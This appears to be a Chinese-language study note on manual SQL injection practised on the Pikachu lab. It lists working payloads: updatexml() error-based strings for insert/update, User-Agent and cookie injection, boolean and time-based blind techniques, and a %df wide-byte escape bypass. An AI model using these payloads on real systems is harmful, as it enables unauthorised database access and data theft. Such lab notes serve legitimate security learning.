**1.SQL手工注入**

1）手工注入猜数据库名，字段名，表名

ascii(substr(database(),x,1))=n

x:库名第x位

n:该位对应的ascii码值

再对n进行爆破

2) insert/updata注入

需要用到 updatexml()报错函数

参考资料：http://www.manongjc.com/detail/17-wttcljhgzzzpcph.html

使用语句：

```
1' or updatexml(1, concat( 0x7e,version()) ,0) or '      抓取数据包，寻找注入点，获取数据库信息
```

http header注入

```
抓包,测试找注入点，一般在user-agent和cookie处，使用payload；基于单引号报错（

1' or updatexml(1, concat( 0x7e,version()) ,0) or '

）；cookie处注入payload（

1' and updatexml(1, concat( 0x7e,version()) ,0)#

）；
```

SQL盲注

1） 布尔盲注

ascii码对照，一一进行爆破

2）时间盲注

根据页面响应的时间作判断，pikachu靶场

3）宽字节注入

   测试注入点。当我们输入有单引号时被转义为\’，无法构造 SQL 语句的时候，可以尝试宽字节注入。

GBK编码中，反斜杠的编码是 “%5c”，而 “%df%5c” 是繁体字 “連”。在皮卡丘平台中，将利用 BurpSuite 截获数据包，发送到 Repeater 中，在里面写入payload，当我们用通常的测试 payload时，是无法执行成功的

因为在后台单引号会被转义，在数据库中执行多了反斜杠，可以使用下面的payload，在单引号前面加上%df，绕过这个WAF。

kobe %df' or 1=1#

参考学习资料：http://www.manongjc.com/detail/17-wttcljhgzzzpcph.html